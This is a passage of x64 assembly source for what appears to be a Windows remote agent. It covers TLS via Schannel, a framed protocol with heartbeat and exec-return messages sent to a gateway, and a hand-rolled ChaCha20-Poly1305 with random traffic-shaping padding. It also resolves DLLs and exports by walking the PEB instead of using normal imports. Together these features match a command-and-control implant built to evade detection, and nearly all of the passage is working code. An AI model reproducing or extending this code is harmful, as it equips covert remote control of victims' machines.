    mov r8d, [stream_sizes]         ; cbHeader
    add r8d, ebx                    ; + data_len
    add rax, r8
    mov qword [rdi + 40], rax

    ; SecBuffer[3]: EMPTY
    mov dword [rdi + 48], 0
    mov dword [rdi + 52], SECBUFFER_EMPTY
    mov qword [rdi + 56], 0

    ; Build SecBufferDesc
    sub rsp, 16
    lea rax, [rsp + 16]            ; point to our 4 SecBuffers
    mov dword [rsp], 0              ; ulVersion
    mov dword [rsp + 4], 4          ; cBuffers = 4
    mov qword [rsp + 8], rax        ; pBuffers

    ; EncryptMessage(&hCtxt, 0, &msg, 0)
    lea rcx, [hCtxt]
    mov edx, 0                      ; fQOP = 0
    lea r8, [rsp]                   ; pMessage (SecBufferDesc)
    mov r9d, 0                      ; MessageSeqNo = 0
    call [ptr_EncryptMessage]
    cmp eax, SEC_E_OK
    jne .ts_fail

    ; Send the encrypted message (header + data + trailer)
    mov edx, [stream_sizes]         ; cbHeader
    add edx, ebx                    ; + data_len
    add edx, [stream_sizes + 4]     ; + cbTrailer
    lea rcx, [tls_token_buf]
    call tls_raw_send

    add rsp, 80                     ; 64 + 16
    pop rsi
    pop rbx
    add rsp, 72
    ret

.ts_fail:
    add rsp, 80
    pop rsi
    pop rbx
    add rsp, 72
    xor eax, eax
    ret

; ===========================================================================
; tls_recv: Receive and decrypt data via TLS (DecryptMessage)
; Input: rcx = output buffer, rdx = requested length
; Returns: bytes copied to output buffer in eax, 0 on error/EOF
; ===========================================================================
tls_recv:
    sub rsp, 88
    mov [rsp + 72], rcx             ; save output buffer
    mov [rsp + 80], edx             ; save requested length

    ; Check if we have buffered decrypted data
    mov eax, [tls_decrypted_len]
    sub eax, [tls_decrypted_off]
    jle .tr_read_more

    ; Return buffered data
    mov ecx, edx                    ; requested length
    cmp ecx, eax
    jle .tr_have_enough
    mov ecx, eax                    ; clamp to available
.tr_have_enough:
    lea rsi, [tls_decrypted_buf]
    mov eax, [tls_decrypted_off]    ; 32-bit load: no neighbor bleed
    add rsi, rax
    mov rdi, [rsp + 72]             ; output buffer
    push rcx
    rep movsb
    pop rax
    add [tls_decrypted_off], eax
    add rsp, 88
    ret

.tr_read_more:
    ; decrypted staging is append-only (frame-boundary compaction happens
    ; in recv_command), so partial-frame rollback stays valid

.tr_loop:
    ; Read more encrypted data
    lea rcx, [tls_recv_buf]
    mov eax, [tls_recv_len]         ; 32-bit load: no neighbor bleed
    add rcx, rax
    mov edx, 32768
    sub edx, [tls_recv_len]
    jle .tr_fail
    call tls_raw_recv
    test eax, eax
    jle .tr_fail
    add [tls_recv_len], eax

    ; Build SecBuffer array for DecryptMessage
    sub rsp, 64
    mov rdi, rsp

    ; SecBuffer[0]: DATA (encrypted)
    mov eax, [tls_recv_len]
    mov dword [rdi], eax
    mov dword [rdi + 4], SECBUFFER_DATA
    lea rax, [tls_recv_buf]
    mov qword [rdi + 8], rax

    ; SecBuffer[1-3]: EMPTY
    mov dword [rdi + 16], 0
    mov dword [rdi + 20], SECBUFFER_EMPTY
    mov qword [rdi + 24], 0
    mov dword [rdi + 32], 0
    mov dword [rdi + 36], SECBUFFER_EMPTY
    mov qword [rdi + 40], 0
    mov dword [rdi + 48], 0
    mov dword [rdi + 52], SECBUFFER_EMPTY
    mov qword [rdi + 56], 0

    ; SecBufferDesc
    sub rsp, 16
    mov dword [rsp], 0
    mov dword [rsp + 4], 4
    lea rax, [rsp + 16]
    mov qword [rsp + 8], rax

    ; DecryptMessage(phContext, pMessage, MessageSeqNo, pfQOP)
    ; NOTE: argument order differs from EncryptMessage (pMessage is 2nd here)
    lea rcx, [hCtxt]
    mov rdx, rsp                    ; pMessage = &SecBufferDesc
    xor r8d, r8d                    ; MessageSeqNo = 0
    xor r9d, r9d                    ; pfQOP = NULL (not needed)
    call [ptr_DecryptMessage]

    ; Check for SEC_E_INCOMPLETE_MESSAGE
    cmp eax, SEC_E_INCOMPLETE_MESSAGE
    je .tr_need_more

    cmp eax, SEC_E_OK
    jne .tr_dec_fail

    ; Success: extract decrypted data
    ; Find the SECBUFFER_DATA buffer (index 0 or 1)
    lea rsi, [rsp + 16]
    mov eax, [rsi]                  ; cbBuffer of buffer[0]
    test eax, eax
    jnz .tr_buf0_ok
    ; Try buffer[1]
    mov eax, [rsi + 16]
    mov rsi, [rsi + 24]
    jmp .tr_copy_decrypted
.tr_buf0_ok:
    mov rsi, [rsi + 8]

.tr_copy_decrypted:
    ; append new plaintext at the current fill level (32-bit load via reg:
    ; [tls_decrypted_len] is a dword, a qword add would bleed its neighbor)
    mov ecx, eax
    mov edx, eax
    lea rdi, [tls_decrypted_buf]
    mov eax, [tls_decrypted_len]
    add rdi, rax
    rep movsb
    add [tls_decrypted_len], edx

    ; Handle EXTRA data buffer
    mov eax, [rsp + 32]             ; buffer[1].cbBuffer
    cmp dword [rsp + 36], SECBUFFER_EXTRA
    jne .tr_no_extra
    mov ecx, eax
    mov rsi, [rsp + 40]
    lea rdi, [tls_recv_buf]
    rep movsb
    mov [tls_recv_len], eax
    jmp .tr_done_extra
.tr_no_extra:
    mov dword [tls_recv_len], 0
.tr_done_extra:

    add rsp, 80                     ; 64 + 16

    ; Now return requested data from buffer
    mov eax, [tls_decrypted_len]
    mov ecx, [rsp + 80]             ; requested length
    cmp ecx, eax
    jle .tr_ret_ok
    mov ecx, eax
.tr_ret_ok:
    lea rsi, [tls_decrypted_buf]
    mov eax, [tls_decrypted_off]    ; append-only staging: valid data starts at off
    add rsi, rax
    mov rdi, [rsp + 72]             ; output buffer
    rep movsb
    add [tls_decrypted_off], ecx
    mov eax, ecx
    add rsp, 88
    ret

.tr_need_more:
    add rsp, 80
    jmp .tr_loop

.tr_dec_fail:
    add rsp, 80                     ; undo the two buffer subs (64 + 16)
    xor eax, eax
    add rsp, 88
    ret

.tr_fail:
    xor eax, eax
    add rsp, 88
    ret

; ===========================================================================
; cleanup_tls: Free Schannel TLS resources
; ===========================================================================
%endif

; ===========================================================================
; cleanup_tls: Free Schannel TLS resources (no-op without a TLS context)
; ===========================================================================
cleanup_tls:
    sub rsp, 40

    cmp qword [ptr_DeleteSecurityContext], 0
    je .ct_no_context
    cmp dword [tls_context_established], 0
    je .ct_no_context
    lea rcx, [hCtxt]
    call [ptr_DeleteSecurityContext]
.ct_no_context:
    cmp qword [ptr_FreeCredentialsHandle], 0
    je .ct_done
    lea rcx, [hCred]
    call [ptr_FreeCredentialsHandle]
.ct_done:
    add rsp, 40
    ret

; ===========================================================================
; send_exec_return: send TypeExecReturn (0x03) frame with payload
; Input: rcx = payload buffer, rdx = payload length
; ===========================================================================
send_exec_return:
    mov r8, rdx
    mov rdx, rcx
    mov ecx, FEI_TYPE_EXEC_RETURN
    jmp send_frame

; ===========================================================================
; send_exception: send TypeException (0x04) frame with message
; Input: rcx = message buffer, rdx = message length
; ===========================================================================
send_exception:
    mov r8, rdx
    mov rdx, rcx
    mov ecx, FEI_TYPE_EXCEPTION
    jmp send_frame

; ===========================================================================
; send_heartbeat: send TypeHeartbeat (0x01) frame (empty-payload fast path)
; ===========================================================================
send_heartbeat:
    mov ecx, FEI_TYPE_HEARTBEAT
    xor edx, edx
    xor r8d, r8d
    jmp send_frame

; ===========================================================================
; send_frame: build, AEAD-seal and transmit one FEI frame
;   ecx = message type (u16), rdx = payload ptr (NULL for none), r8d = length
; Wire format must match the Go gateway byte for byte:
;   - heartbeat + empty payload + zero padding => bare 36-byte header only
;     (gateway ReadEncryptedFrame fast path: no tag on the wire)
;   - everything else => header(AAD) || ciphertext || 16-byte tag || padding,
;     nonce = le32(seq) || agent_id, Poly1305 one-time key from block 0
; ===========================================================================
send_frame:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub rsp, 64                     ; 7 pushes + 64 = 120: 16-byte aligned at calls

    mov r12w, cx                  ; message type
    mov r13, rdx                  ; payload ptr
    mov r14d, r8d                 ; payload len
    mov [frame_payload_len], r14d

    ; seq++
    mov eax, [seq_counter]
    inc eax
    mov [seq_counter], eax
    mov r15d, eax

    ; timestamp: FILETIME -> unix ms, big-endian
    lea rcx, [filetime_buf]
    call GetSystemTimeAsFileTime
    mov rax, [filetime_buf]
    mov rcx, 116444736000000000     ; 1601->1970 epoch shift (needs imm64)
    sub rax, rcx
    xor rdx, rdx
    mov rcx, 10000
    div rcx
    bswap rax
    mov [header_buf + 26], rax

    ; build header
    mov dword [header_buf], FEI_MAGIC
    mov word [header_buf + 4], FEI_PROTO_VER
    mov [header_buf + 6], r12w
    mov [header_buf + 8], r15d
    mov [header_buf + 12], r14d
    mov word [header_buf + 16], 0        ; padding_len filled before sealing
    mov rax, [agent_id]
    mov [header_buf + 18], rax
    mov word [header_buf + 34], 0        ; reserved tail must stay zero

    ; every frame is sealed — including empty heartbeats (the old
    ; plaintext fast path let unauthenticated bare headers through)
.seal:
    ; nonce = le32(seq) || agent_id
    mov [cc_nonce], r15d
    mov rax, [agent_id]
    mov [cc_nonce + 4], rax

    ; random padding length 0..128 (part of the AAD, so chosen before sealing)
    call random_padding_len
    mov [header_buf + 16], ax

    ; AEAD: out = ciphertext || tag
    lea rcx, [header_buf]
    mov rdx, r13
    mov r8d, [frame_payload_len]
    lea r9, [frame_out + HEADER_SIZE]
    call aead_compute

    ; header goes in front of the frame
    lea rsi, [header_buf]
    lea rdi, [frame_out]
    mov ecx, HEADER_SIZE / 4
    rep movsd

    ; random garbage after the tag
    movzx ecx, word [header_buf + 16]
    test ecx, ecx
    jz .send
    mov eax, [frame_payload_len]
    lea rdi, [frame_out + HEADER_SIZE + AEAD_TAG_SIZE]
    add rdi, rax
.fill_pad:
    call random_byte
    mov [rdi], al
    inc rdi
    dec ecx
    jnz .fill_pad

.send:
    mov eax, [frame_payload_len]
    add eax, HEADER_SIZE + AEAD_TAG_SIZE
    movzx edx, word [header_buf + 16]
    add eax, edx
    lea rcx, [frame_out]
    mov edx, eax
    call tls_send

.done:
    add rsp, 64
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret

; ===========================================================================
; random_byte / random_padding_len: crude entropy from RDTSC.
; The padding is traffic-shaping garbage, not a cryptographic value.
; ===========================================================================
random_byte:
    rdtsc
    shr eax, 8
    ret

random_padding_len:
    rdtsc
    xor edx, edx
    mov ecx, 129
    div ecx                         ; edx = 0..128
    mov eax, edx
    ret

; ===========================================================================
; chacha_init_state: (re)build cc_state from PSK + cc_nonce
; Input: ecx = block counter. Preserves ecx.
; ===========================================================================
chacha_init_state:
    push rsi
    push rdi
    push r8
    lea rsi, [chacha_const]
    lea rdi, [cc_state]
    mov r8d, 4
.cis_const:
    movsd
    dec r8d
    jnz .cis_const
    lea rsi, [psk]
    mov r8d, 8
.cis_key:
    movsd
    dec r8d
    jnz .cis_key
    ; word 12 = block counter (offset 48), words 13-15 = nonce (offset 52)
    mov [cc_state + CC_IDX_CTR * 4], ecx
    add rdi, 4
    lea rsi, [cc_nonce]
    mov r8d, 3
.cis_nonce:
    movsd
    dec r8d
    jnz .cis_nonce
    pop r8
    pop rdi
    pop rsi
    ret

; ===========================================================================
; aead_compute: ChaCha20-Poly1305 seal (RFC 8439, gateway-compatible)
;   rcx = 36-byte header (AAD), rdx = plaintext ptr, r8d = length,
;   r9  = output buffer, receives ciphertext || 16-byte tag
; Nonce comes from cc_nonce (set by the caller).
; ===========================================================================
aead_compute:
    push rbx
    sub rsp, 56
    mov [rsp], rcx                  ; header
    mov [rsp + 8], rdx              ; plaintext
    mov [rsp + 16], r9              ; out
    mov [rsp + 24], r8              ; len

    xor ecx, ecx
    call chacha_init_state
    call chacha20_block             ; block 0 = poly1305 key stream
    call poly1305_init_key

    ; MAC the header
    mov rsi, [rsp]
    mov ecx, HEADER_SIZE
    call poly1305_update

    ; ciphertext = plaintext xor keystream(counter = 1, 2, ...)
    mov rax, [rsp + 16]
    mov [enc_dst_ptr], rax
    mov rax, [rsp + 8]
    mov [enc_src_ptr], rax
    mov eax, [rsp + 24]
    mov [enc_remaining], eax
    mov dword [enc_ctr], 1
    lea rbp, [cc_keystream]         ; indexed addressing needs a real base reg

.se_loop:
    cmp dword [enc_remaining], 0
    jle .se_done
    mov ecx, [enc_ctr]
    call chacha_init_state
    call chacha20_block
    mov ecx, CHA_CHA_BLOCK_SIZE
    cmp ecx, [enc_remaining]
    jbe .se_chunk
    mov ecx, [enc_remaining]
.se_chunk:
    mov ebx, ecx
    mov rsi, [enc_src_ptr]
    mov rdi, [enc_dst_ptr]
    xor edx, edx
.se_xor:
    mov al, [rsi + rdx]
    xor al, [rbp + rdx]
    mov [rdi + rdx], al
    inc edx
    cmp edx, ecx
    jb .se_xor
    add [enc_src_ptr], rbx
    add [enc_dst_ptr], rbx
    sub [enc_remaining], ebx
    inc dword [enc_ctr]
    jmp .se_loop
.se_done:

    ; MAC the ciphertext
    mov rsi, [rsp + 16]
    mov ecx, [rsp + 24]
    call poly1305_update

    ; MAC le64(aad_len) || le64(msg_len)
    mov dword [poly_lenblk], HEADER_SIZE
    mov dword [poly_lenblk + 4], 0
    mov eax, [rsp + 24]
    mov [poly_lenblk + 8], eax
    mov dword [poly_lenblk + 12], 0
    lea rsi, [poly_lenblk]
    mov ecx, 16
    call poly1305_update

    ; tag -> out + len
    mov rdi, [rsp + 16]
    add rdi, [rsp + 24]
    call poly1305_finish

    add rsp, 56
    pop rbx
    ret

; ===========================================================================
; ChaCha20 block function
; Input:  cc_state[0..15] filled with key/nonce/counter
; Output: cc_keystream[0..63] = 64 bytes of keystream
; ===========================================================================
chacha20_block:
    sub rsp, 8

    ; Copy state to orig (for final addition)
    lea rsi, [cc_state]
    lea rdi, [cc_orig]
    mov ecx, 16
.copy_loop:
    mov eax, [rsi]
    mov [rdi], eax
    add rsi, 4
    add rdi, 4
    dec ecx
    jnz .copy_loop

    ; 20 rounds (10 double-rounds)
    mov ecx, 10
.round_loop:
    push rcx

    ; Column rounds: QR(0,4,8,12), QR(1,5,9,13), QR(2,6,10,14), QR(3,7,11,15)
    call qr_col_0_4_8_12
    call qr_col_1_5_9_13
    call qr_col_2_6_10_14
    call qr_col_3_7_11_15

    ; Diagonal rounds: QR(0,5,10,15), QR(1,6,11,12), QR(2,7,8,13), QR(3,4,9,14)
    call qr_diag_0_5_10_15
    call qr_diag_1_6_11_12
    call qr_diag_2_7_8_13
    call qr_diag_3_4_9_14

    pop rcx
    dec ecx
    jnz .round_loop

    ; Add original state
    lea rsi, [cc_orig]
    lea rdi, [cc_state]
    mov ecx, 16
.add_loop:
    mov eax, [rsi]
    add [rdi], eax
    add rsi, 4
    add rdi, 4
    dec ecx
    jnz .add_loop

    ; Serialize state to keystream (little-endian)
    lea rsi, [cc_state]
    lea rdi, [cc_keystream]
    mov ecx, 64 / 8
.ser_loop:
    mov rax, [rsi]
    mov [rdi], rax
    add rsi, 8
    add rdi, 8
    dec ecx
    jnz .ser_loop

    add rsp, 8
    ret

; ===========================================================================
; Quarter Round helpers — operate directly on cc_state words
; QR(a,b,c,d):
;   a += b; d ^= a; d <<<= 16
;   c += d; b ^= c; b <<<= 12
;   a += b; d ^= a; d <<<= 8
;   c += d; b ^= c; b <<<= 7
; ===========================================================================

; Macro for quarter round on 4 memory offsets (word indices into cc_state)
%macro QUARTER_ROUND 4
    ; a += b
    mov eax, [cc_state + %2 * 4]
    add [cc_state + %1 * 4], eax
    ; d ^= a; d <<<= 16
    mov eax, [cc_state + %1 * 4]
    xor [cc_state + %4 * 4], eax
    mov eax, [cc_state + %4 * 4]
    rol eax, 16
    mov [cc_state + %4 * 4], eax
    ; c += d
    mov eax, [cc_state + %4 * 4]
    add [cc_state + %3 * 4], eax
    ; b ^= c; b <<<= 12
    mov eax, [cc_state + %3 * 4]
    xor [cc_state + %2 * 4], eax
    mov eax, [cc_state + %2 * 4]
    rol eax, 12
    mov [cc_state + %2 * 4], eax
    ; a += b
    mov eax, [cc_state + %2 * 4]
    add [cc_state + %1 * 4], eax
    ; d ^= a; d <<<= 8
    mov eax, [cc_state + %1 * 4]
    xor [cc_state + %4 * 4], eax
    mov eax, [cc_state + %4 * 4]
    rol eax, 8
    mov [cc_state + %4 * 4], eax
    ; c += d
    mov eax, [cc_state + %4 * 4]
    add [cc_state + %3 * 4], eax
    ; b ^= c; b <<<= 7
    mov eax, [cc_state + %3 * 4]
    xor [cc_state + %2 * 4], eax
    mov eax, [cc_state + %2 * 4]
    rol eax, 7
    mov [cc_state + %2 * 4], eax
%endmacro

qr_col_0_4_8_12:
    QUARTER_ROUND 0, 4, 8, 12
    ret
qr_col_1_5_9_13:
    QUARTER_ROUND 1, 5, 9, 13
    ret
qr_col_2_6_10_14:
    QUARTER_ROUND 2, 6, 10, 14
    ret
qr_col_3_7_11_15:
    QUARTER_ROUND 3, 7, 11, 15
    ret
qr_diag_0_5_10_15:
    QUARTER_ROUND 0, 5, 10, 15
    ret
qr_diag_1_6_11_12:
    QUARTER_ROUND 1, 6, 11, 12
    ret
qr_diag_2_7_8_13:
    QUARTER_ROUND 2, 7, 8, 13
    ret
qr_diag_3_4_9_14:
    QUARTER_ROUND 3, 4, 9, 14
    ret

; ===========================================================================
; poly1305_init_key: derive clamped r / s from cc_keystream (ChaCha block 0)
; and reset the accumulator. Limb layout: r = r0 + r1*2^44 + r2*2^88 with
; r0,r1 < 2^44 and r2 < 2^42; h = h0 + h1*2^44 + h2*2^88 + h3*2^132 + h4*2^176.
; ===========================================================================
poly1305_init_key:
    mov rax, [cc_keystream]         ; r, low 64 bits
    mov rdx, [cc_keystream + 8]     ; r, high 64 bits
    mov r11, 0x0ffffffc0fffffff    ; clamp low qword: bytes ff ff ff 0f fc ff ff 0f
    and rax, r11
    mov r11, 0x0ffffffc0ffffffc    ; clamp high qword
    and rdx, r11
    mov r11, MASK44
    mov rcx, rax
    and rcx, r11
    mov [poly_r], rcx               ; r0
    shrd rax, rdx, 44
    and rax, r11
    mov [poly_r + 8], rax           ; r1
    shr rdx, 24
    and rdx, r11
    mov [poly_r + 16], rdx          ; r2
    mov rax, [cc_keystream + 16]
    mov [poly_s], rax
    mov rax, [cc_keystream + 24]
    mov [poly_s + 8], rax
    xor eax, eax
    mov [poly_h], rax
    mov [poly_h + 8], rax
    mov [poly_h + 16], rax
    mov [poly_h + 24], rax
    mov [poly_h + 32], rax
    ret

; ===========================================================================
; poly1305_update: absorb rsi[0..ecx) into the MAC state.
; Full 16-byte blocks are processed directly; a trailing partial block is
; staged with a 0x01 byte appended at its end (RFC 8439 padding).
; ===========================================================================
; ===========================================================================
; poly1305_update: absorb rsi[0..ecx) into the MAC state.
; AEAD pad0 semantics (RFC 8439 2.8): a trailing partial chunk is zero-padded
; to 16 bytes and processed as a full block (with the 2^128 addend).
; ===========================================================================
poly1305_update:
    push rbx
    push r12
    mov r12, rsi
    mov ebx, ecx
.pu_full:
    cmp ebx, 16
    jb .pu_tail
    mov rsi, r12
    call poly1305_block
    add r12, 16
    sub ebx, 16
    jmp .pu_full
.pu_tail:
    test ebx, ebx
    jz .pu_done
    lea rdi, [poly_partial_blk]
    xor eax, eax
    mov [rdi], rax
    mov [rdi + 8], rax
    mov ecx, ebx
    mov rsi, r12
    rep movsb                        ; remaining bytes, then zero padding
    lea rsi, [poly_partial_blk]
    call poly1305_block
.pu_done:
    pop r12
    pop rbx
    ret

; ===========================================================================
; poly1305_block: absorb one 16-byte block at rsi (full-block semantics).
; ===========================================================================
poly1305_block:
    push rbx
    push rbp
    push r12
    mov rax, [rsi]                  ; m0
    mov rdx, [rsi + 8]              ; m1
    mov r11, MASK44
    mov rcx, rax
    and rcx, r11
    add [poly_h], rcx               ; h0 += m[0:44]
    shrd rax, rdx, 44
    and rax, r11
    add [poly_h + 8], rax           ; h1 += m[44:88]
    shr rdx, 24
    mov rcx, 0x10000000000
    add rdx, rcx                    ; hibit: 1 << 40 (i.e. 2^128 in h2 units)
    add [poly_h + 16], rdx          ; h2 += m[88:128] + 2^128
    call poly1305_mul
    pop r12
    pop rbp
    pop rbx
    ret

; Product accumulation into a 128-bit cell on the stack
; %1 = cell byte offset, %2 = h limb byte offset, %3 = register holding r limb
%macro PMUL_ACC 3
    mov rax, [poly_h + %2]
    mul %3
    add [rsp + %1], rax
    adc [rsp + %1 + 8], rdx
%endmacro

; [rsp+%1] += ([rsp+%2] as 128-bit) << %3
%macro FOLD_SHL 3
    mov rax, [rsp + %2]
    mov rdx, [rsp + %2 + 8]
    mov r12, rdx
    shl r12, %3
    mov r13, rax
    shr r13, (64 - %3)
    or r12, r13
    shl rax, %3
    add [rsp + %1], rax
    adc [rsp + %1 + 8], r12
%endmacro

; ===========================================================================
; poly1305_mul: h = (h * r) mod (2^130 - 5), lazy-reduction limb math.
; Schoolbook 3x3 limbs into t0..t6, then fold high limbs using 2^130 = 5:
;   t0 += 20*t3 + 400*t6 ; t1 += 20*t4 ; t2 += 20*t5
; and re-extract 44/44/42-bit limbs with carries.
; ===========================================================================
poly1305_mul:
    push rbx
    push rbp
    push r12
    push r13
    push r14
    push r15
    sub rsp, 128                    ; t0..t6 = 7 x 128-bit at [rsp+0..0x6F]

    lea rdi, [rsp]
    xor eax, eax
    mov ecx, 14
    rep stosq

    mov r8, [poly_r]                ; r0
    mov r9, [poly_r + 8]            ; r1
    mov r10, [poly_r + 16]          ; r2

    ; t0 = h0*r0
    PMUL_ACC 0, 0, r8
    ; t1 = h0*r1 + h1*r0
    PMUL_ACC 16, 0, r9
    PMUL_ACC 16, 8, r8
    ; t2 = h0*r2 + h1*r1 + h2*r0
    PMUL_ACC 32, 0, r10
    PMUL_ACC 32, 8, r9
    PMUL_ACC 32, 16, r8
    ; t3 = h1*r2 + h2*r1 + h3*r0
    PMUL_ACC 48, 8, r10
    PMUL_ACC 48, 16, r9
    PMUL_ACC 48, 24, r8
    ; t4 = h2*r2 + h3*r1 + h4*r0
    PMUL_ACC 64, 16, r10
    PMUL_ACC 64, 24, r9
    PMUL_ACC 64, 32, r8
    ; t5 = h3*r2 + h4*r1
    PMUL_ACC 80, 24, r10
    PMUL_ACC 80, 32, r9
    ; t6 = h4*r2
    PMUL_ACC 96, 32, r10

    ; fold high limbs down (2^130 = 5, offsets of 2 bits land inside limbs)
    FOLD_SHL 0, 48, 2               ; t0 += t3 << 2
    FOLD_SHL 0, 48, 4               ; t0 += t3 << 4   (=> 20*t3)
    FOLD_SHL 16, 64, 2              ; t1 += t4 << 2
    FOLD_SHL 16, 64, 4              ; t1 += t4 << 4   (=> 20*t4)
    FOLD_SHL 32, 80, 2              ; t2 += t5 << 2
    FOLD_SHL 32, 80, 4              ; t2 += t5 << 4   (=> 20*t5)
    FOLD_SHL 0, 96, 8               ; t0 += t6 << 8
    FOLD_SHL 0, 96, 7               ; t0 += t6 << 7
    FOLD_SHL 0, 96, 4               ; t0 += t6 << 4   (=> 400*t6)

    ; extract limbs with carries
    mov r11, MASK44
    mov r13, MASK44
    mov rax, [rsp]
    mov rdx, [rsp + 8]
    mov r14, rax
    and r14, r13                    ; h0 candidate
    shr rax, 44
    shl rdx, 20
    or rax, rdx                     ; c = t0 >> 44
    add [rsp + 16], rax
    adc qword [rsp + 24], 0

    mov rax, [rsp + 16]
    mov rdx, [rsp + 24]
    mov r15, rax
    and r15, r13                    ; h1 candidate
    shr rax, 44
    shl rdx, 20
    or rax, rdx                     ; c = t1 >> 44
    add [rsp + 32], rax
    adc qword [rsp + 40], 0

    mov rax, [rsp + 32]
    mov rdx, [rsp + 40]
    mov rbx, rax
    mov r13, MASK42
    and rbx, r13                    ; h2 candidate
    shr rax, 42
    shl rdx, 22
    or rax, rdx                     ; c = t2 >> 42
    lea rax, [rax + rax*4]          ; 5*c
    add r14, rax
    mov rax, r14
    shr rax, 44
    and r14, r11                    ; MASK44 (r11 loaded below)
    add r15, rax                    ; propagate carry into h1

    mov [poly_h], r14
    mov [poly_h + 8], r15
    mov [poly_h + 16], rbx

    add rsp, 128
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbp
    pop rbx
    ret

; ===========================================================================
; poly1305_finish: fully carry h, reduce once mod (2^130-5), output tag
; = (h + s) mod 2^128 to [rdi] (16 bytes).
; ===========================================================================
poly1305_finish:
    ; carry propagation to canonical limbs
    mov r11, MASK44
    mov rax, [poly_h]
    shr rax, 44
    and [poly_h], r11
    add [poly_h + 8], rax
    mov rax, [poly_h + 8]
    shr rax, 44
    and [poly_h + 8], r11
    add [poly_h + 16], rax

    ; fold h2 bits >= 42 (i.e. value >= 2^130) back into h0 with factor 5
    mov rax, [poly_h + 16]
    mov r10, MASK42
    shr rax, 42
    and [poly_h + 16], r10
    lea rax, [rax + rax*4]          ; 5 * overflow
    add [poly_h], rax
    mov rax, [poly_h]
    shr rax, 44
    and [poly_h], r11
    add [poly_h + 8], rax

    ; g = h + 5 - 2^130; use g when no borrow (h >= 2^130 - 5)
    mov rax, [poly_h]
    mov rdx, [poly_h + 8]
    mov r8, [poly_h + 16]
    add rax, 5
    adc rdx, 0
    adc r8, 0
    mov r10, 0x40000000000
    sub r8, r10                     ; subtract 2^130
    jc .keep
    and rax, r11
    and rdx, r11
    mov [poly_h], rax
    mov [poly_h + 8], rdx
    mov [poly_h + 16], r8
.keep:
    ; tag128 = (h0 | h1<<44) , (h1>>20 | h2<<24)  then + s  (mod 2^128)
    mov rcx, [poly_h]
    mov rdx, [poly_h + 8]
    mov r8, [poly_h + 16]
    mov rax, rdx
    shl rax, 44
    or rax, rcx                     ; tag low 64
    mov r9, rdx
    shr r9, 20
    mov r10, r8
    shl r10, 24                     ; h2*2^88 mod 2^64: bits >= 128 drop off
    or r9, r10                      ; tag high 64
    add rax, [poly_s]
    adc r9, [poly_s + 8]
    mov [rdi], rax
    mov [rdi + 8], r9
    ret

; ===========================================================================
; PEB Walk: find DLL base address by name
; Input:  rcx = DLL name (ASCII, null-terminated), rdx = name length (bytes incl. null)
; Output: rax = DLL base address, 0 if not found
; Clobbers: rcx, rdx, r8, r9, r10, r11
; ===========================================================================
find_dll_base:
    push rbx
    push rsi
    push rdi
    push rbp
    mov rbp, rcx
    mov r11d, edx

    mov rax, [gs:0x60]
    mov rax, [rax + 0x18]        ; PEB->Ldr
    lea rdi, [rax + 0x10]        ; InLoadOrderModuleList head
    mov rbx, [rdi]               ; first entry (Flink)

.fdb_loop:
    cmp rbx, rdi
    je .fdb_fail

    movzx eax, word [rbx + 0x58]     ; BaseDllName.Length (bytes)
    test ax, ax
    jz .fdb_next
    shr eax, 1                       ; -> characters (ASCII-named DLLs)
    cmp r11d, eax
    jne .fdb_next

    mov rsi, [rbx + 0x60]            ; BaseDllName.Buffer
    mov r8, rbp
    mov r9d, r11d
    xor ecx, ecx

.fdb_cmp:
    cmp ecx, r9d
    jge .fdb_found
    movzx eax, byte [r8 + rcx]
    movzx r10d, word [rsi + rcx * 2]
    cmp eax, 0x41
    jl .fdb_nolower
    cmp eax, 0x5A
    jg .fdb_nolower
    add eax, 0x20
.fdb_nolower:
    cmp r10d, 0x41
    jl .fdb_nolower2
    cmp r10d, 0x5A
    jg .fdb_nolower2
    add r10d, 0x20
.fdb_nolower2:
    cmp eax, r10d
    jne .fdb_next
    inc ecx
    jmp .fdb_cmp

.fdb_found:
    mov rax, [rbx + 0x30]        ; LDR_DATA_TABLE_ENTRY.DllBase
    jmp .fdb_done
.fdb_next:
    mov rbx, [rbx]
    jmp .fdb_loop
.fdb_fail:
    xor eax, eax
.fdb_done:
    pop rbp
    pop rdi
    pop rsi
    pop rbx
    ret

; ===========================================================================
; Find exported function by name from PE export table
; Input:  rcx = module base, rdx = function name (ASCII), r8d = name len (incl null)
; Output: rax = function address, 0 if not found
; ===========================================================================
find_export:
    push rbx
    push rsi
    push rdi
    push rbp
    push r12
    push r13
    push r14
    push r15

    mov rbp, rcx
    mov r12, rdx
    mov r13d, r8d

    mov eax, [rbp + 0x3C]        ; e_lfanew
    mov eax, [rbp + rax + 0x88] ; DataDirectory[0].VirtualAddress (export dir RVA)
    test eax, eax
    jz .fe_fail                 ; no export table
    lea r14, [rbp + rax]        ; export directory VA

    mov eax, [r14 + 0x20]
    lea r10, [rbp + rax]
    mov eax, [r14 + 0x18]
    mov r11d, eax

    mov eax, [r14 + 0x24]
    lea r9, [rbp + rax]
    mov eax, [r14 + 0x1C]
    lea r8, [rbp + rax]

    xor ebx, ebx
.fe_loop:
    cmp ebx, r11d
    jge .fe_fail

    movsxd rax, ebx
    mov eax, [r10 + rax * 4]
    lea rsi, [rbp + rax]

    xor ecx, ecx
.fe_cmp:
    movzx eax, byte [r12 + rcx]
    movzx edx, byte [rsi + rcx]
    test al, al
    jz .fe_check_end
    cmp al, dl
    jne .fe_next
    inc ecx
    jmp .fe_cmp

.fe_check_end:
    test dl, dl
    jnz .fe_next

    movzx eax, word [r9 + rbx * 2]
    movzx rax, ax
    mov eax, [r8 + rax * 4]
    lea rax, [rbp + rax]
    jmp .fe_done

.fe_next:
    inc ebx
    jmp .fe_loop
.fe_fail:
    xor eax, eax
.fe_done:
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbp
    pop rdi
    pop rsi
    pop rbx
    ret

; ===========================================================================
; Winsock initialization — calls WSAStartup through resolved pointer
; Returns: 0 on success, nonzero on failure
; ===========================================================================
init_winsock:
    sub rsp, 40
    mov cx, WS_VERSION
    lea rdx, [wsa_data]
    call [ptr_WSAStartup]
    add rsp, 40
    ret

; ===========================================================================
; Resolve ws2_32 functions via PEB walk
; Returns: 1 on success, 0 on failure
; ===========================================================================
resolve_ws2_functions:
    sub rsp, 40

    ; ws2_32 is delay-mapped by most processes and may not be loaded yet;
    ; pull it in first (kernel32 is a static import), then PEB-walk it.
    lea rcx, [str_ws2_32]
    call LoadLibraryA
    test rax, rax
    jz .rw2_fail

